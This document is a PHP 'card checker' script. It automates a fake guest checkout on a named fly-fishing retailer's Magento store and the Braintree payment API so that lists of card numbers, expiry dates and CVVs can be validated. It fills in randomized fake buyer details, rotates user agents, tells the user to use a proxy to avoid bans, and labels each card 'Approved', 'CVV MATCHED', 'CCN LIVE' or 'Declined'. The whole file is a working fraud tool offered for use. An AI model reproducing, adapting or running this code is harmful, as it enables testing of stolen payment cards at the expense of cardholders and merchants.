<?php

#/// API Made By: @anonmous000 aka 🏴‍☠🃏A000🃏🏴‍☠
#/// Channel & Chat: @BinBhai & @BinBhaiFamily | 🏴‍☠️【Bв™】
#/// Rest API
#/// Gate: [Braintree + Magneto Auth]
#/// Total Requests: [06]
#/// Site Type: [SHOP CHECKOUT]
#/// Site: [https://www.tridentflyfishing.com/]
#/// Product Link: [https://www.tridentflyfishing.com/trident-gift-card.html]
#/// Use Proxy/VPN Enjoy_xD...!!!

#---///Credits\\\---#

$credits = "[☠️【★Bв™】Bin Bhai]"; /// PUT YOUR NAME

#---///[I Am Using ProxyLess Checker Here]\\\---#

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
$Device_Session_Id = uniqid();
$Correlation_Id = uniqid();

#---///[START]\\\---#

if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};

#---///A [0-0-0]\\\---#

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function Braintree($data = 36){
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
};

$Session_Id = Braintree();

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (empty($lista)) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-warning">『 ★ Bete Enter Your CC First ★ 』</i></font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
    die();
};

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

#---///Random Personal Details\\\---#

$name   = ucfirst(str_shuffle('ashish'));
$last    = ucfirst(str_shuffle('mishra'));
$mail   = "binbhaia000".substr(md5(uniqid()),0,3)."@telegmail.com";
$ph      = array("682","346","246");
$ph1     = array_rand($ph);
$phh     = $ph[$ph1];
$phone   = "$phh".rand(0000000,9999999)."";

$User_Agent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11, 99).'';

#---///1st Request [Set-Cookie]>>>GET METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tridentflyfishing.com/checkout/');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$resultc = curl_exec($ch);
$time0 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Php_SessId = getStr($resultc,'set-cookie: PHPSESSID=',';');

#---///1st Request [Product Page]>>>GET METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tridentflyfishing.com/trident-gift-card.html');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
$time1 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Url_Token = getStr($result1,'action="https://www.tridentflyfishing.com/checkout/cart/add/uenc/','/');
$Form_Key = getStr($result1,'name="form_key" type="hidden" value="','"');

#---///2nd Request [Add To Cart]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tridentflyfishing.com/checkout/cart/add/uenc/'.$Url_Token.'/product/61687/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryGDklzB5kJxm7FQJM',
'cookie: PHPSESSID='.$Php_SessId.'; form_key='.$Form_Key.'; hblid=h5ZMM8vmknFvLrJs266LX0JrB6SAAkb0; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _geuid=7eeebf7a-e2b2-4106-a9f4-e8feb9d52baf; _geps=true; _gid=GA1.2.524687071.1690584299; _lc2_fpi=ae358319cefd--01h6fatddtnn3aqrjmk7m94gbd; olfsk=olfsk2894643386906688; __attentive_id=402e7effc6e8427e93d48ee79dcd92cf; _attn_=eyJ1Ijoie1wiY29cIjoxNjkwNTg0MzAwNTk3LFwidW9cIjoxNjkwNTg0MzAwNTk3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjQwMmU3ZWZmYzZlODQyN2U5M2Q0OGVlNzlkY2Q5MmNmXCJ9In0=; __attentive_cco=1690584300601; _fbp=fb.1.1690584301160.302152073; __attentive_dv=1; form_key='.$Form_Key.'; wp_ga4_customerGroup=NOT%20LOGGED%20IN; tracker_device=abaf2196-da54-4120-80d8-ac1e1f3e16a6; _gess=true; wcsid=8nV6Jkj0jDEenAFy266LX0JAajB6SrbA; _okdetect=%7B%22token%22%3A%2216906353696770%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; _li_dcdm_c=.tridentflyfishing.com; __attentive_ss_referrer=ORGANIC; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1690635374747%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=4823-332-10-6682; bounceClientVisit5539v=N4IgNgDiBcIBYBcEQM4FIDMBBNAmAYnvgO6kB0CATgJYAmApgHYIBmYAni9SnNYwOZkAxgHsAtkRAAaEJRghpIbgH1+I5SnooU1EYxgsAhmE0yV-CBq069B45oC+QA; sociallogin_referer_store=https%3A%2F%2Fwww.tridentflyfishing.com%2Fcheckout%2F; private_content_version=2c34d28cf11f0b322d6f9a3c3f40bb0e; section_data_ids=%7B%22cart%22%3A1690635931%2C%22directory-data%22%3A1690635450%2C%22signifyd-fingerprint%22%3A1690635450%2C%22wp_ga4%22%3A1690635931%2C%22personal-data%22%3A1690635931%7D; klv_mage={"expire_sections":{"customerData":1690636539}}; _ga_B14MKHS4TY=GS1.1.1690635367.2.1.1690635941.35.0.0; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTA1ODQyOTksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnRyaWRlbnRmbHlmaXNoaW5nLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2OTA2MzU5NDIsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnRyaWRlbnRmbHlmaXNoaW5nLmNvbS8ifX0=; cto_bundle=JfQ8DV9YMEhVaXdKeWlONGJyczl1QmJua29VbEpkdGsydEpTa0FOdndHNXhTNFlTd3lrVDBXRnZEYjdDbDBrZDVETTElMkJDTm9QNCUyRjM4enppWE40JTJCRjJVeGglMkZYZ0E5UGZGdiUyRjJ0cEhLWUo3eXVxdCUyRlVVVHRnUGxSTnZPMmFuJTJGY1JjYzhjQllYd0xBQVhxVGdScXpHT0pIQkglMkZQTjhXdGZOTHJHeFFGR3ZoSWhEMzFjJTNE; _ga=GA1.2.1843295416.1690584297; __attentive_pv=9; _oklv=1690635950005%2C8nV6Jkj0jDEenAFy266LX0JAajB6SrbA; _ga_SX7J1B9YJB=GS1.2.1690635372.2.1.1690635950.35.0.0; avmws=1.104566910664c444eab9085434562949.142021253.1690635370.1690635956.6.1865457440',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryGDklzB5kJxm7FQJM
Content-Disposition: form-data; name="product"

61687
------WebKitFormBoundaryGDklzB5kJxm7FQJM
Content-Disposition: form-data; name="selected_configurable_option"


------WebKitFormBoundaryGDklzB5kJxm7FQJM
Content-Disposition: form-data; name="related_product"


------WebKitFormBoundaryGDklzB5kJxm7FQJM
Content-Disposition: form-data; name="item"

61687
------WebKitFormBoundaryGDklzB5kJxm7FQJM
Content-Disposition: form-data; name="form_key"

'.$Form_Key.'
------WebKitFormBoundaryGDklzB5kJxm7FQJM
Content-Disposition: form-data; name="qty"

1
------WebKitFormBoundaryGDklzB5kJxm7FQJM--');
$result2 = curl_exec($ch);
$time2 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

#---///3rd Request [Checkout]>>>GET METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tridentflyfishing.com/checkout/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result3 = curl_exec($ch);
$time3 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Guest_Token = getstr($result3, '{"entity_id":"','"');
$encodedbearer = getstr($result3, '"clientToken":"','"');
#-----[Decode & Capture Authorization Bearer From Encoded Bearer]-----#
$decode = base64_decode($encodedbearer);
$Bearer = getstr($decode, '"authorizationFingerprint":"','",');

#---///4th Request [Billing/Shipping Information]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tridentflyfishing.com/rest/default/V1/guest-carts/'.$Guest_Token.'/shipping-information');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["Christopher Street"],"company":"","telephone":"'.$phone.'","postcode":"10080","city":"Newyork","firstname":"'.$name.'","lastname":"'.$last.'"},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["Christopher Street"],"company":"","telephone":"'.$phone.'","postcode":"10080","city":"Newyork","firstname":"'.$name.'","lastname":"'.$last.'","saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{"kl_sms_consent":false,"kl_email_consent":false}}}');
$result4 = curl_exec($ch);
$time4 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

#---///5th Request [Authorizing Credit Card]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'authorization: Bearer '.$Bearer.'',
'braintree-version: 2018-05-10',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$Session_Id.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$result5 = curl_exec($ch);
$time5 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Token = getStr($result5,'"token":"','"');
$Bin = getStr($result5,'"bin":"','"');
$Last4 = getStr($result5,'"last4":"','"');

#---///6th Request [Authorizing Credit Card]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tridentflyfishing.com/rest/default/V1/guest-carts/'.$Guest_Token.'/payment-information');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$Guest_Token.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["Christopher Street"],"company":"","telephone":"'.$phone.'","postcode":"10080","city":"Newyork","firstname":"'.$name.'","lastname":"'.$last.'","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$Token.'","device_data":"{\"device_session_id\":\"'.$Device_Session_Id.'\",\"fraud_merchant_id\":null,\"correlation_id\":\"'.$Correlation_Id.'\"}","cardBin":"'.$Bin.'","cardLast4":"'.$Last4.'"}},"email":"'.$mail.'"}');
$result = curl_exec($ch);
$time6 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Respo1 = getStr($result,'"message":"','"');
$Respo = str_replace("Your payment could not be taken. Please try again or use a different payment method.","",$Respo1);

#------------[Last REQ Response]------------#

$took = $time0 + $time1 + $time2 + $time3 + $time4 + $time5 + $time6;
$time = round($took, 7);

#-----[CVV [CHARGED] Response]-----#

if (strpos($result, "99")){ 
echo '<font size=3.5 color="white"><font class="badge badge-success">#Aprovadas </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ Approved | [1000] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CVV AVS Failed Response]-----#

elseif ((strpos($result, 'Gateway Rejected: avs')) || (strpos($result, 'avs')) || (strpos($result, 'AVS MISMATCH'))){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Aprovadas </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV MATCHED | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CVV Insufficient Funds Response]-----#

elseif ((strpos($result, 'Insufficient Funds')) || (strpos($result, 'Insufficient'))){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Aprovadas </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV MATCHED | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CCN Response]-----#

elseif ((strpos($result, 'Card Issuer Declined CVV')) || (strpos($result, 'Card Issuer Declined CVV'))){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Aprovadas </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CCN LIVE | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[IP Fucked Response]-----#

elseif (strpos($result, 'Banned')){
echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Banned | [IP FUCKED/CHANGE IP/PROXY] ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[DEAD Response]-----#

elseif (strpos($result, $Respo1)){
echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Declined | ['.$Respo.'] ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

else {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Declined | Try Again or Contact To Host To Fix This..! @BinBhai ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree + Magneto Auth</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';

file_put_contents('Braintree_Magneto_Error.txt', $lista.$result.PHP_EOL , FILE_APPEND | LOCK_EX);

}

//echo "<br><b>COOKIE:</b> $resultc<br><br>";
//echo "<br><b>1:</b> $result1<br><br>";
//echo "<br><b>2:</b> $result2<br><br>";
//echo "<br><b>3:</b> $result3<br><br>";
//echo "<br><b>4:</b> $result4<br><br>";
//echo "<br><b>5:</b> $result5<br><br>";
//echo "<br><b>6:</b> $result<br><br>";
//echo "<br><b>PHPSESSID:</b> $Php_SessId<br><br>";
//echo "<br><b>URL TOKEN:</b> $Url_Token<br><br>";
//echo "<br><b>FORM KEY:</b> $Form_Key<br><br>";
//echo "<br><b>AUTHORIZATION FINGERPRINT:</b> $Bearer<br><br>";
//echo "<br><b>TOKEN:</b> $Token<br><br>";
//echo "<br><b>BIN:</b> $Bin<br><br>";
//echo "<br><b>LAST 4DIGIT CC:</b> $Last4<br><br>";
//echo "<br><b>GUEST TOKEN:</b> $Guest_Token<br><br>";
//echo "<br><b>RESPONSE 1:</b> $Respo1<br><br>";
//echo "<br><b>RESPONSE:</b> $Respo<br><br>";

curl_close($ch);
ob_flush();
@unlink('cookie.txt');

#---///[THE END]\\\---#

//sleep(3);

?>